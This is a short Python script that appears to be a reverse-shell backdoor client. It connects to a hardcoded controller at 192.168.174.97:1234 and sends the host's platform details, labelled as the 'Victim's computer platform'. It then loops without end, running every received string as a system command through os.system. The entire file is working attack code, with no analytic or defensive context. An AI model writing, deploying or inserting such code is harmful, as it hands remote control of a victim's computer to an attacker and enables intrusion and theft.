from socket import *
import os
import platform
infor=platform.platform()
sysinfo="Victim's computer platform : "+platform.system()
ip="192.168.174.97"
port=1234
clientSock = socket(AF_INET, SOCK_STREAM)
clientSock.connect((ip,port))
clientSock.send(infor.encode('utf-8'))
clientSock.send(sysinfo.encode('utf-8'))
while True:
    recvData = clientSock.recv(1024)
    recvData=recvData.decode('utf-8')
    os.system(recvData)
    sendData = "OK"
    clientSock.send(sendData.encode('utf-8'))
